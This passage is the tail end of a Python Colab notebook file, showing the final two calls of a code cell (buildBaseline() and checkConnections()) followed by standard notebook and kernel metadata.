        "            \n",
        "\n",
        "buildBaseline()\n",
        "checkConnections()"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNys587idKyv4zWU0drhF1R",
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}